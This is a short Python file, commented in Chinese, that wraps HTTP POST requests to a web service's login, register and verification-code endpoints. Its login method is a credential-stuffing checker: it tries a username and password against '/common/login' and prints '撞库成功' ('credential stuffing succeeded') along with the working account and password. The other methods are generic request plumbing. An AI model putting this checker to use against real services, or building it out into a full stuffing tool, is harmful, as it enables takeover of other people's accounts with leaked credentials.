```
import requests  
import json  
  
  
class requestWeb:  
  
    def __init__(self,url):  
        self.url = url  
        pass  
  
# 这是我们的post请求函数  
    def sendPost(self,session,webUrl,payload,head):  
          
        re = None  
        if payload and head:  
            re = session.post(webUrl,json=payload,headers=head)  
        elif payload:  
            re = session.post(webUrl,json=payload)  
        elif head:  
            re = session.post(webUrl,headers=head)  
        else:  
            re = session.post(webUrl)  
  
        return re   
  
  
  
    def login(self,username,password,session):  
  
        webUrl = self.url + "/common/login"     
        payload = {"name":username,"password":password}  
        re = self.sendPost(session=session,payload= payload,head=None,webUrl=webUrl)      
        if re.status_code != 200:  
            print("请求直接失败，服务器都没有访问成功")  
            return False  
  
        data = json.loads(re.text)      
        if data["code"] != 200:  
            print(data["msg"])  
            print("账户是：" + username + "   密码：" + password)  
            return False  
  
        print("撞库成功")  
        print("账户：" + username + "    密码：" + password)      
        return True  
      
  
  
  
  
  
    def register(self,url,payload,session):  
  
        webUrl = url + "/api/register"  
  
        re = self.sendPost(session,webUrl,payload,None)  
  
        # 他的状态码，有可能是302，因为他会让浏览器执行一个跳转  
        if re.status_code != 200 and re.status_code != 302:  
            print("此处的一个请求失败")  
            print(re.text)  
            return False  
  
        data = json.loads(re.text)  
  
        status = data["success"]  
  
        if status == "false":  
            print("请求成功了，但是这里返回的服务端自定义状态是错误")  
            print(data)  
            return False  
        print("注册成功")  
        return True  
  
  
  
  
    def codeLogin(self,url,payload,session):  
  
        webUrl = url + "/api/login/verify"  
  
        re = self.sendPost(session,webUrl,payload,None)  
  
        # 他的状态码，有可能是302，因为他会让浏览器执行一个跳转  
        if re.status_code != 200 and re.status_code != 302:  
            print("此处的一个请求失败")  
            print(re.text)  
            return False  
  
        data = json.loads(re.text)  
  
        status = data["success"]  
  
        if status == "false":  
            print("请求成功了，但是这里返回的服务端自定义状态是错误")  
            print(data)  
            return False  
        print("登录成功")  
        return True
```
